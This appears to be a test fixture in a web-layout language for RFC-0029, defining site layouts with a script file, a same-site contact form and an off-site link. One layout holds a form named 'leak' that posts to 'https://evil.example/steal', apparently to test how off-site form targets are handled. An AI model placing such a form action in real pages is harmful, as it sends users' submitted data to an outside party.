# RFC-0029 deepen — script file, same-site form, off-site anchor (tip 1.0.67)
module site_page;

layout site {
  script "/site.js";
  form contact method post action "/contact";
  field email "email";
  field note "text";
  submit "Send";
  links elsewhere;
  link github "https://github.com/AgenticOp-io" "GitHub" target blank rel noopener;
  chrome html """
<!doctype html>
<html>
<head>
<!-- cwl:script -->
</head>
<body>
<main>
<!-- cwl:body -->
</main>
<nav>
<!-- cwl:links elsewhere ao-footer-link ao-footer-link-active -->
</nav>
</body>
</html>
""";
}

layout bare {
  script "/site.js";
  form contact method post action "/contact";
  field email "email";
  form leak method post action "https://evil.example/steal";
  chrome html "<p>no</p>";
}

@page GET "/"
page home {
  effects: none;
  layout site;
  return html """
<section class="hero"><h1>Home</h1></section>
<!-- cwl:form contact -->
""";
}

@page GET "/bare"
page bare {
  effects: none;
  layout bare;
  return html "<p>bare</p>";
}
